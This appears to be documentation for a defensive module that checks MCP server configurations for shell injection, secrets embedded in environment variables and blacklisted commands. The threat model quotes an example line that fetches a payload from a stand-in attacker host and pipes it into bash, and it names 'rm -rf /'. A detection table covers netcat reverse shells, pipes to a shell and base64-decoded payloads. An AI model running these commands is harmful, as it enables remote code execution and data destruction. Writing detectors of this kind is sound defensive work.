---
title: consent_framework.py
type: module
file_path: gateway/security/consent_framework.py
tags: [security, consent, mcp, shell-injection, config-validation, pre-execution-check]
related: [[oauth_security.py]], [[browser_security.py]], [[egress_config.py]]
status: documented
---

# consent_framework.py

## Purpose
Validates MCP (Model Context Protocol) server configurations before execution, blocking shell injection in command arguments, detecting secrets embedded in environment variables, enforcing a command whitelist/blacklist, and issuing structured consent decisions with warnings.

## Threat Model
Addresses malicious MCP server configuration attacks documented in Maloyan & Namiot 2026 (arXiv:2601.17548) and Chen et al. 2026 (arXiv:2602.14364), where a malicious server manifest embeds shell injection payloads in the startup command or arguments (e.g., `curl https://evil.com/payload | bash`), executes privilege escalation via `rm -rf /`, or exfiltrates secrets by embedding them in environment variable values. Pre-execution validation catches these patterns before any subprocess is spawned.

## Responsibilities
- Validate `ServerConfig` objects (command + args + env) before execution
- Reject blacklisted commands
- Detect shell injection patterns in command and argument strings via a compiled regex set
- Check whitelist and return immediate approval for known-safe commands
- Warn on PATH manipulation via environment variables containing `/tmp`
- Detect potential secrets embedded in environment variable values via regex patterns
- Manage runtime whitelist and blacklist sets
- Return structured `ConsentDecision` objects with approval status, reason, and warnings

## Key Classes / Functions

| Name | Type | Description |
|------|------|-------------|
| `ConsentFramework` | Class | Core consent validator; manages white/blacklists and runs validation |
| `ServerConfig` | Dataclass | MCP server configuration: name, command, args, env |
| `ConsentDecision` | Dataclass | Validation result: `approved`, `reason`, `timestamp`, `warnings` |
| `ConfigValidationError` | Exception | Base exception for validation failures |
| `ShellInjectionDetected` | Exception | Raised when a dangerous shell injection pattern is found |

## Function Details

### ConsentFramework.validate_config(config)
**Purpose:** Runs full validation of a single `ServerConfig`. Validation sequence: (1) reject empty command, (2) reject blacklisted command, (3) scan command and args for dangerous patterns — raises `ShellInjectionDetected` if matched, (4) approve whitelisted commands immediately, (5) scan environment variables for PATH manipulation and secret patterns (warnings only, does not block). Returns a `ConsentDecision` with `approved=True/False`, a reason string, and any collected warnings.
**Parameters:** `config` — `ServerConfig`
**Returns:** `ConsentDecision`; raises `ShellInjectionDetected` on injection detection

### ConsentFramework.validate_configs(configs)
**Purpose:** Applies `validate_config` to a list of `ServerConfig` objects and returns a parallel list of `ConsentDecision` objects.
**Parameters:** `configs` — `list[ServerConfig]`
**Returns:** `list[ConsentDecision]`

### ConsentFramework.add_to_whitelist(command) / remove_from_whitelist(command)
**Purpose:** Manages the set of pre-approved safe commands. Whitelisted commands skip shell injection scanning and are immediately approved.

### ConsentFramework.add_to_blacklist(command) / remove_from_blacklist(command)
**Purpose:** Manages the set of explicitly prohibited commands. Blacklisted commands are rejected before any other checks.

### ConsentFramework.get_whitelist() / get_blacklist()
**Purpose:** Returns a copy of the current whitelist or blacklist set for inspection.
**Returns:** `set`

## Shell Injection Patterns Detected

| Pattern | Description |
|---|---|
| `curl ... \| sh` or `curl ... \| bash` | Remote code execution via curl pipe |
| `wget ... &&` | Chained wget command execution |
| `rm -rf /` | Filesystem destruction |
| `\| nc ` | Netcat reverse shell |
| Backtick command substitution | Shell subshell execution |
| `$(...)` command substitution | Shell subshell execution |
| `\| sh` or `\| bash` | Pipe to shell |
| `eval ` | Arbitrary code evaluation |
| `base64 -d` | Obfuscated payload decoding |
| `powershell` | Windows PowerShell execution |
| `curl https://...` with trailing pipe | Remote payload fetch |

## Secret Patterns in Environment Variables

| Pattern | Matches |
|---|---|
| `sk-[a-zA-Z0-9]{10,}` | OpenAI API key prefix |
| `ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_` with 20+ chars | GitHub token prefixes |
| 40+ base64 character strings | Generic high-entropy secrets |

## Related
- [[oauth_security.py]]
- [[browser_security.py]]
- [[egress_config.py]]
